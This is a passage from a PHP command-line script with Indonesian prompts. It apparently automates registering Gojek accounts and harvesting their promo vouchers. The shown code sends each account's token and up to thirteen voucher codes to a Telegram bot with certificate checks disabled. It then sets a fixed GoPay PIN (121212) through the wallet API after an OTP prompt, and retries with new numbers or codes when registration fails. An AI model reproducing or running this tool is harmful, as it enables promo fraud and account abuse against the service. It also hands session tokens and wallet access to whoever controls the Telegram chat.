      	$pesan 	= "[+] Gojek Account Info [+]\n\n".$token."\n\nTotalVoucher = ".$total."\n[+] ".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+] ".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]\n[+] ".$voucher8."\n[+] Exp : [".$expired8."]\n[+] ".$voucher9."\n[+] Exp : [".$expired9."]\n[+] ".$voucher10."\n[+] Exp : [".$expired10."] ".$voucher11."\n[+] Exp : [".$expired11."]\n[+] ".$voucher12."\n[+] Exp : [".$expired12."]\n[+] ".$voucher13."\n[+] Exp : [".$expired13."]\n[+]";
      	$method	= "sendMessage";
      	$url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
      	$post = [
      		'chat_id' => $chatid,
                'text' => $pesan
        	];
                $header = [
                "X-Requested-With: XMLHttpRequest",
                "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36" 
                        ];
                                        $ch = curl_init();
                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                        curl_setopt($ch, CURLOPT_URL, $url);
                                        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
                                        curl_setopt($ch, CURLOPT_POSTFIELDS, $post );   
                                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                                        $datas = curl_exec($ch);
                                        $error = curl_error($ch);
                                        $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                                        curl_close($ch);
                                        $debug['text'] = $pesan;
                                        $debug['respon'] = json_decode($datas, true);
         setpin:
         echo "\n".color("purple","SET PIN GOPAY: (Y/N) ");
         $pilih1 = trim(fgets(STDIN));
         if($pilih1 == "y" || $pilih1 == "Y"){
         //if($pilih1 == "y" && strpos($no, "628")){
         echo color("nevy","▬▬▬▬▬▬▬▬▬▬▬▬▬▬🔧 PIN ANDA = 121212 🔧▬▬▬▬▬▬▬▬▬▬▬▬")."\n";
         $data2 = '{"pin":"121212"}';
         $getotpsetpin = request("/wallet/pin", $token, $data2, null, null, $uuid);
         echo "Otp pin: ";
         $otpsetpin = trim(fgets(STDIN));
         $verifotpsetpin = request("/wallet/pin", $token, $data2, null, $otpsetpin, $uuid);
         echo $verifotpsetpin;
         }else if($pilih1 == "n" || $pilih1 == "N"){
         die();
         }else{
         echo color("red","-] GAGAL!!!\n");
         }
         }
         }
         }else{
         echo color("red","-] KODE OTP SALAH..!!");
         echo"\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n\n";
         echo color("purple","!] ULANGI LAGI\n");
         goto otp;
         }
         }else{
         echo color("red","-] NOMOR SUDAH PERNAH TERDAFTAR");
         echo"\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n\n";
         echo color("purple","!] COBA NOMOR LAIN \n");
         goto tulup;
         }
//  }

// echo change()."\n";
